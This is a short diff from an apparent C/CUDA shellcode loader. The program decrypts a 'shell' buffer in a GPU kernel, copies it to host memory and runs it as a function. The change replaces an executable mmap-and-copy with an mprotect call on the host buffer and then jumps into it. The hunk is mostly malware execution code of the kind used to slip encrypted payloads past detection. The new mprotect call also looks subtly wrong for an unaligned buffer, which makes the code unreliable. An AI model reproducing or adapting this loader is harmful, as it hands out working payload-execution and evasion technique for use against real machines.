@@ -31,11 +31,9 @@ int main(void){
   decrypt<<<1,len>>>(d_shell);
   cudaMemcpy(h_shell, d_shell, sizeof(char)*len, cudaMemcpyDeviceToHost);
   cudaFree(d_shell);
-  char *d=(char *)mmap(NULL,len,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);
-    
-  memcpy(d,h_shell,len);
+  mprotect(h_shell,len,PROT_EXEC); 
 
-  ((void(*)(void))d)();
+  ((void(*)(void))h_shell)();
 
 
 }
